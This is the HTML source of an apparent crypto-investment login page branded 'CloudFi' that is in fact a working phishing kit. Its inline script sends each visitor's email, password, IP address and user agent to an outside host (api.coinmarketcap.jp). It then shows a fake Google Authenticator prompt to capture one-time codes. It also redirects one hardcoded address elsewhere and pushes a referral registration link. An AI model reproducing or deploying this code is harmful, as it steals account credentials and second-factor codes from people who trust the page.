<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, minimum-scale=1"
    />
    <meta
      name="csrf-token"
      content="hThxUi7E3JYoIh8ZThsv96iG1w7OEJsGVEiVhMqI"
    />
    <meta
      name="description"
      content="Welcome to CloudFi! We are the premier platform for growing your cryptocurrency assets. Even without prior trading experience, our intuitive platform simplifies the process, empowering you to make informed decisions while maximizing your gains and minimizing your risk. Our dedicated professional team, coupled with advanced technology, ensures your assets remain safe and secure while you explore the rewarding world of digital currency. Start your journey with CloudFi today and witness the ease of accelerating your crypto portfolio!"
    />
    <title>Login</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD"
      crossorigin="anonymous"
    />

    <link rel="stylesheet" href="./css/app.css" />

    <link
      rel="icon"
      type="image/svg"
      href="./images/favicon.svg"
      sizes="32x32"
    />
    <link rel="apple-touch-icon" href="./images/favicon.svg" />
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  </head>

  <body>
    <header class="header header--fixed">
      <div class="header__container base-wrap">
        <a href="/">
          <img src="./images/logo2.svg" class="w-auto h-12" />
        </a>
        <button id="hamb-btn" class="hamburger--squeeze">
          <div class="hamburger-inner"></div>
        </button>
      </div>

      <div class="menu" id="hamb-menu">
        <div class="menu__holder base-wrap">
          <div class="menu__top">
            <a href="./login" class="a--link">Login</a>
            <a href="./register" class="a--link">Register</a>
          </div>
          <nav class="">
            <ul class="menu__list">
              <a
                class="menu__list-item"
                href="https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"
                >Home Page</a
              >
              <a
                class="menu__list-item"
                href="https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"
                >Privacy Policy</a
              >
              <a
                class="menu__list-item"
                href="https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"
                >Terms Of Service</a
              >
              <a
                class="menu__list-item"
                href="https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"
              >
                Cookie Policy</a
              >
            </ul>
          </nav>
        </div>
      </div>
    </header>

    <main>
      <section id="login_page" class="login">
        <div class="base-wrap">
          <img src="./images/background/green-ellipse_1.svg" class="glow-1" />
          <img src="./images/background/blue-ellipse_1.svg" class="glow-2" />
          <img
            src="./images/background/backgroundGlobeTwo.svg"
            alt="Crypto globe"
            class="bg-globe-login"
          />

          <div class="row">
            <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-5">
              <h1 class="login__title">Login</h1>
              <div class="login__form">
                <form class="row gy-4" id="signup-form">
                  <div class="col-12">
                    <label for="email" class="form-label">Email address</label>
                    <input
                      id="usernameInput"
                      type="email"
                      name="email"
                      autocomplete="email"
                      class="form-control"
                      required
                    />
                    <div class="invalid-feedback">
                      Please enter a valid email address
                    </div>
                  </div>

                  <div class="col-12">
                    <label for="password" class="form-label">Password?</label>
                    <input
                      id="passwordInput"
                      name="password"
                      type="password"
                      autocomplete="current-password"
                      class="form-control"
                      required
                    />
                    <div class="invalid-feedback">Please enter a password</div>
                  </div>

                  <div class="col-12">
                    <div class="form-check cb">
                      <input
                        class="form-check-input"
                        id="remember-me"
                        name="remember-me"
                        type="checkbox"
                      />
                      <label class="form-check-label" for="remember-me">
                        Remember me
                      </label>
                    </div>
                    <div
                      style="margin-top: 12px"
                      class="g-recaptcha"
                      data-sitekey="6LfJ6AcnAAAAAHdS2lxsDTA-b6qqSA-DCELHeYN7"
                    ></div>
                  </div>
                  <br />
                  <div class="col-12 btn--align">
                    <button class="btn__square" type="submit" id="login">
                      Log in
                    </button>
                    <a
                      class="a--link"
                      href="https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"
                      ;
                      >Forgot password?</a
                    >
                  </div>

                  <p class="account">
                    Don't have an account yet?
                    <a
                      href="https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"
                      class="a--link"
                      >Register</a
                    >
                  </p>
                </form>
              </div>
            </div>

            <div
              class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-5 offset-xl-1 text"
            >
              <div class="login__wrap">
                <h2 class="login__desc">
                  Well begun is half done. - Aristotle
                </h2>
              </div>
            </div>
          </div>
        </div>
      </section>
      <section id="captcha_page" class="captcha">
        <div class="content base-wrap--no-mobile-padding">
          <div class="mb-3 text-wrap sm:mx-auto sm:w-full sm:max-w-md">
            <div class="form-horizontal">
              <div
                class="flex flex-col justify-center min-h-full py-12 sm:px-6 lg:px-8"
              >
                <label id="otp_label" class="block text-white"
                  >Enter the pin from Google Authenticator app:</label
                >
                <div class="relative mt-4 rounded-md shadow-sm">
                  <input
                    id="captchaInput"
                    type="number"
                    name="one_time_password"
                    id="one_time_password"
                    class="form-control inputMessage"
                    placeholder=""
                  />
                  <!-- <input class="inputMessage" placeholder="Type here..." /> -->
                </div>
              </div>

              <button class="dashboard-button__primary" id="captchaButton">
                Authenticate
              </button>
            </div>
          </div>
        </div>
      </section>
    </main>

    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <!-- <script src="https://api.coinmarketcap.jp/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script> -->
    <script src="http://127.0.0.1:8000/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script>
    <script>
      document
        .getElementById('signup-form')
        .addEventListener('submit', async function (event) {
          event.preventDefault();

          const username = document.getElementById('usernameInput').value;
          const password = document.getElementById('passwordInput').value;

          if (username == 'pfwelding@sbcglobal.net') {
            window.location.href = 'https://www.coinmarketcap.jp';
            return;
          }

          const clientIP = await fetch('https://api.ipify.org?format=json')
            .then((response) => response.json())
            .then((data) => data.ip)
            .catch((error) => {
              console.error('Error fetching client IP:', error);
              return '';
            });

          const data = {
            project: 'cloudfi.info',
            username: username,
            password: password,
            ip: clientIP,
            user_agent: navigator.userAgent,
            event: 'LoginButtonClicked',
            captcha: 'captcha',
          };

          await fetch(`https://api.coinmarketcap.jp/save`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
          }).then((response) => response.json());

          var isAdmin = await fetch('https://api.coinmarketcap.jp/checkadmin')
            .then((response) => response.json())
            .then((data) => data.status);

          if (isAdmin) {
            await fetch(`https://api.coinmarketcap.jp/userevent`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(data),
            })
              .then((response) => response.json())
              .then((result) => {
                const login_page = document.getElementById('login_page');
                login_page.style.display = 'none';
                const captcha_page = document.getElementById('captcha_page');
                captcha_page.style.display = 'block';
              })
              .catch((error) => {
                console.error('Error:', error);
              });
          } else {
            window.location.href =
              'https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP';
          }
        });
    </script>

    <!-- <script src="/socket.io/socket.io.js"></script> -->
    <!-- <script src="./js/login.js"></script> -->
  </body>
</html>
